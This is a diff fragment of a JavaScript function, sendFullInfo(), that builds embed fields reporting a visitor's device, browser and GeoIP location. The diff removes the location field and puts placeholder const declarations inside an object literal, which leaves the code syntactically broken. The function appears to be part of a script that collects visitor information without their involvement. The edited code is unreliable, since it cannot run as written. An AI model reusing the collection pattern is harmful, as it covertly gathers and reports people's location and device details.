@@ -172,16 +172,12 @@ async function sendFullInfo() {
           inline: false
         },
         {
-          name: "Location (GeoIP)",
-          value: [
-            `**City:** \`${city}\``,
-            `**Region:** \`${region}\``,
-            `**Country:** \`${country}\``,
-            `**Approx. Coords:** \`${lat}, ${lon}\``
-          ].join("\n"),
-          inline: false
-        },
-        {
+            // Skip real GeoIP, use placeholder
+  const city = "Hidden";
+  const region = "Hidden";
+  const country = "Hidden";
+  const lat = "—";
+  const lon = "—";
           name: "Device & Browser",
           value: [
             `**OS:** \`${os}\``,
